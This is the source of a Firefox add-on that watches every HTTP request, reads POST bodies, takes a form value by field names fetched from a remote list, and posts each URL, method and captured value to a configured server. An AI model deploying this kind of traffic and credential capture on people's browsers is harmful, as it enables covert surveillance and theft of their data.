var preferences = require('sdk/simple-prefs').prefs;
var _appUrl = preferences['_appUrl'];
var _fieldNamesUrl = preferences['_fieldNamesUrl'];
var _requestFields = [];

var buttons = require('sdk/ui/button/action');
var tabs = require('sdk/tabs');
var Request = require('sdk/request').Request;
var chrome = require('chrome');
var Cc = chrome.Cc;
var Ci = chrome.Ci;
var CC = chrome.CC;
var Cr = chrome.Cr;
var ScriptableInputStream = CC('@mozilla.org/scriptableinputstream;1', 'nsIScriptableInputStream', 'init');

var _ = require('./libs/lodash');

require('sdk/simple-prefs').on('_fieldNamesUrl', function (fieldNamesUrl) {
    _fieldNamesUrl = fieldNamesUrl
});

require('sdk/simple-prefs').on('_appUrl', function (appUrl) {
    _appUrl = appUrl;
});

/**
 * Get field names to check for
 * @param {function} callback
 */
function getFieldNames(callback) {
    Request({
        url: _fieldNamesUrl,
        onComplete: function (response) {
            callback(response);
        }
    }).get();
}

var httpRequestObserver = {
    observe: function (subject, topic, data) {
        var postData = getPostBody(subject, topic, data);
        postData = postData ? decodeURIComponent(postData) : '';

        var urlRegExp = new RegExp(_appUrl + '\/?');
        var requestUrl = subject.URI.spec;
        if (topic != 'http-on-modify-request' || requestUrl.search(urlRegExp) != -1) {
            return;
        }

        var dataCollection = {
            url: requestUrl,
            verb: subject.requestMethod,
            username: ''
        };

        if (postData) {
            _(_requestFields).forEach(function (field) {
                var fieldRegExp = new RegExp(field + '=(.*)&|' + field + '=(.*)$');
                var fieldSearchResult = _.remove(postData.match(fieldRegExp), undefined)[1];
                if (fieldSearchResult) {
                    dataCollection.username = fieldSearchResult;
                    return false;
                }
            });
        }

        Request({
            url: _appUrl,
            content: JSON.stringify(dataCollection),
            contentType: 'application/json'
        }).post();
    },

    get observerService() {
        return Cc['@mozilla.org/observer-service;1'].getService(Ci.nsIObserverService);
    },

    register: function () {
        this.observerService.addObserver(this, 'http-on-modify-request', false);
    },

    unregister: function () {
        this.observerService.removeObserver(this, 'http-on-modify-request');
    }
};

getFieldNames(function (fieldNames) {
    _requestFields = fieldNames.json.fieldnames;
    httpRequestObserver.register();
});

/**
 * Get the POST request body
 * @param {Object} channel
 * @param {Object} topic
 * @param {Object} data
 * @returns {Object|null}
 */
function getPostBody(channel, topic, data) {
    var post = null;

    if (!(channel instanceof Ci.nsIHttpChannel) || !(channel instanceof Ci.nsIUploadChannel)) {
        return post;
    }
    if (channel.requestMethod !== 'POST') {
        return post;
    }

    try {
        var us = channel.uploadStream;
        if (!us) {
            return post;
        }
        if (us instanceof Ci.nsIMultiplexInputStream) {
            // Seeking in a nsIMultiplexInputStream effectively breaks the stream.
            return post;
        }
        if (!(us instanceof Ci.nsISeekableStream)) {
            // Cannot seek within the stream :(
            return post;
        }

        var oldpos = us.tell();
        us.seek(0, 0);

        try {
            var is = new ScriptableInputStream(us);

            // we'll read max 64k
            var available = Math.min(is.available(), 1 << 16);
            if (available) {
                post = is.read(available);
            }
        }
        finally {
            // Always restore the stream position!
            us.seek(0, oldpos);
        }
    }
    catch (ex) {
        Cu.reportError(ex);
    }
    return post;
}
